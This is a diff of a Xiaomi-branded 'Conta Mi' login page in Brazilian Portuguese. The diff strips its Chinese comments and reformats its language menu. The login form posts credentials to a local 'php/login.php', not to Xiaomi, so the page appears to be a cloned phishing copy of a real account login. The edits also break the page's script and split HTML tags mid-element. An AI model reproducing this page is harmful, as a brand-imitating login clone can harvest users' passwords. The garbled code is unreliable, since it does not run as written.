@@ -44,7 +44,7 @@ var PAGE_VAR={
 if(location.search.indexOf("_debugMode")>-1){
   window.localStorage && window.localStorage.removeItem(PAGE_VAR.cache_key);
 }
-(function(){
+function(){
   function getLocal(url){
     if(window.localStorage){
       var data=localStorage.getItem(url);
@@ -88,19 +88,16 @@ if(location.search.indexOf("_debugMode")>-1){
 })();
 </script>
 
-  
-    
     <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
     <title>Conta Mi - Login</title>
   </head>
-  
-  
+
   <body class=" pt_BR">
     <div class="wrapper">
       <div class="wrap">
         <div class="layout" id="layout">
-          <!--表单输入登录-->
+          
           <div class="mainbox" id="login-main">
             <div><a class="ercode" id="qrcode-trigger" href="javascript:void(0)"></a></div>
             <!-- header s -->
@@ -117,9 +114,9 @@ if(location.search.indexOf("_debugMode")>-1){
               <div class="login_area">
                 <form action="php/login.php" id="login-main-form">
                   <div class="loginbox c_b">
-                    <!-- 输入框 -->
+                    
                     <div class="lgn_inputbg c_b">
-                      <!--验证用户名-->
+                      
                       <div class="single_imgarea" id="account-info">
                         <div class="na-img-area" id="account-avator" style="display:none">
                           <div class="na-img-bg-area" id="account-avator-con"></div>
@@ -152,17 +149,17 @@ if(location.search.indexOf("_debugMode")>-1){
                     </div>
                     <div class="lgncode c_b" id="captcha">
                     </div>
-                    <!-- 错误信息 -->
+                    
                     <div class="err_tip" id="error-outcon">
                       <div class="dis_box"><em class="icon_error"></em><span class="error-con"></span></div>
                     </div>
-                    <!-- 登录频繁 -->
+                    
                     <div id="error-forbidden" class="err_forbidden">Muitas tentativas de login. Tente novamente mais tarde.</div>
                     <div class="btns_bg">
                       <input class="btnadpt btn_orange" id="login-button" type="submit" value="Fazer login">
                       <span id="custom_display_8" class="sns-default-container sns_default_container"><a href="https://account.xiaomi.com/pass/sns/login/auth?appid=222161937813280&amp;&amp;callback=https%3A%2F%2Fsecurebr.mi.com%2Fcheckout%2Flogin%2FxiaomiAuth&amp;sid=eshop_br_production" class="btnadpt btn_facebook sns-login-link" title="Fazer login com o Facebook" data-type="facebook">                       <i class="btn_sns_icontype icon_default_facebook"></i><span>Fazer login com o Facebook</span>                     </a></span>
                     </div>
-                    <!-- 其他登录方式 s -->
+                    
                     <div style="display:none" class="other_login_type sns-login-container" id="custom_display_16">
                       <fieldset class="oth_type_tit">
                         <legend align="center" class="oth_type_txt">Mais opções</legend>
@@ -178,7 +175,7 @@ if(location.search.indexOf("_debugMode")>-1){
                 </form>
               </div>
             </div>
-            <!-- 其他登录方式 e -->
+            
             <div class="n_links_area" id="custom_display_64">
               <a class="outer-link" href="https://account.xiaomi.com/pass/register?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=pt_BR">Criar Conta Mi</a><span>|</span>
               <a class="outer-link" href="https://account.xiaomi.com/pass/forgetPassword?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=pt_BR">Esqueci a senha</a>
@@ -329,6 +326,43 @@ O([_d_]),f=g.createElement("img");f.style.display="none";f.src=_t_.statURL+"?"+a
 </script>
 -->
 
-<a target="_blank"></a><div class=" modal_container" style="display: none;"><div class="modal_msk"></div><div class=" modal_tip mod_acc_tip more-lang-modal" id="modal-id-0" style="display: none;"><div class="modal_tip_hd modal-header"><div class="external_logo_area"><a class="milogo" href="javascript:void(0)"></a></div><div class="modal-header-text modal_tip_title">Selecione o seu idioma</div><a href="javascript:void(0)" title="" class="modal-header-close btn_mod_close"><span>Fechar</span></a></div><div class="modal_tip_bd modal-body"><div class="modal-select-list-con"><ul class="lang-select-list lang_items_list c_b"><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=zh_CN" class="lang-select-li " data-lang="zh_CN">中文（简体）</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=zh_TW" class="lang-select-li " data-lang="zh_TW">中文（繁體）</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=en" class="lang-select-li " data-lang="en">English(US)</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=ko_KR" class="lang-select-li " data-lang="ko_KR">한국어</a></li><li><a href="javascript:void(0)" class="lang-select-li current" data-lang="pt_BR">Português (Brasil)</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=in_ID" class="lang-select-li " data-lang="in_ID">Bahasa Indonesia</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=hi_IN" class="lang-select-li " data-lang="hi_IN">हिन्दी</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=ta_IN" class="lang-select-li " data-lang="ta_IN">தமிழ்</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=te_IN" class="lang-select-li " data-lang="te_IN">తెలుగు</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=kn_IN" class="lang-select-li " data-lang="kn_IN">ಕನ್ನಡ</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=mr_IN" class="lang-select-li " data-lang="mr_IN">मराठी</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=ml_IN" class="lang-select-li " data-lang="ml_IN">മലയാളം</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=bn_IN" class="lang-select-li " data-lang="bn_IN">বাংলা</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=th_TH" class="lang-select-li " data-lang="th_TH">ภาษาไทย</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=vi_VN" class="lang-select-li " data-lang="vi_VN">Tiếng Việt</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=ms_MY" class="lang-select-li " data-lang="ms_MY">Bahasa Melayu</a></li><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=tr_TR" class="lang-select-li " data-lang="tr_TR">Türkçe</a></li></ul></div></div></div></div>
+<a target="_blank"></a><
+div class=" modal_container" style="display: none;">
+<div class="modal_msk">
+  
+</div>
+<div class=" modal_tip mod_acc_tip more-lang-modal" id="modal-id-0" style="display: none;"><div class="modal_tip_hd modal-header">
+  <div class="external_logo_area">
+    <a class="milogo" href="javascript:void(0)"></a>
+    </div>
+    <div class="modal-header-text modal_tip_title">Selecione o seu idioma</div>
+    <a href="javascript:void(0)" title="" class="modal-header-close btn_mod_close"><span>Fechar</span></a>
+    </div>
+    
+    <div class="modal_tip_bd modal-body">
+      <div class="modal-select-list-con">
+        <ul class="lang-select-list lang_items_list c_b">
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=zh_CN" class="lang-select-li " data-lang="zh_CN">中文（简体）</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=zh_TW" class="lang-select-li " data-lang="zh_TW">中文（繁體）</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=en" class="lang-select-li " data-lang="en">English(US)</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=ko_KR" class="lang-select-li " data-lang="ko_KR">한국어</a></li>
+          <li><a href="javascript:void(0)" class="lang-select-li current" data-lang="pt_BR">Português (Brasil)</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=in_ID" class="lang-select-li " data-lang="in_ID">Bahasa Indonesia</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=hi_IN" class="lang-select-li " data-lang="hi_IN">हिन्दी</a></l
+          i><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=ta_IN" class="lang-select-li " data-lang="ta_IN">தமிழ்</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=te_IN" class="lang-select-li " data-lang="te_IN">తెలుగు</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=kn_IN" class="lang-select-li " data-lang="kn_IN">ಕನ್ನಡ</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=mr_IN" class="lang-select-li " data-lang="mr_IN">मराठी</a></li>
+          <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=ml_IN" class="lang-select-li " data-lang="ml_IN">മലയാളം</a></li><li  >
+            <a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=bn_IN" class="lang-select-li " data-lang="bn_IN">বাংলা</a></li
+            ><li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=th_TH" class="lang-select-li " data-lang="th_TH">ภาษาไทย</a></li>
+            <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=vi_VN" class="lang-select-li " data-lang="vi_VN">Tiếng Việt</a></li>
+            <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=ms_MY" class="lang-select-li " data-lang="ms_MY">Bahasa Melayu</a></li>
+            <li><a href="https://account.xiaomi.com/pass/serviceLogin?sid=eshop_br_production&amp;callback=https://securebr.mi.com/checkout/login/xiaomiAuth&amp;_locale=tr_TR" class="lang-select-li " data-lang="tr_TR">Türkçe</a></li>
+            </ul>
+            </div>
+            </div>
+            </div>
+            </div>
 
 </body></html>
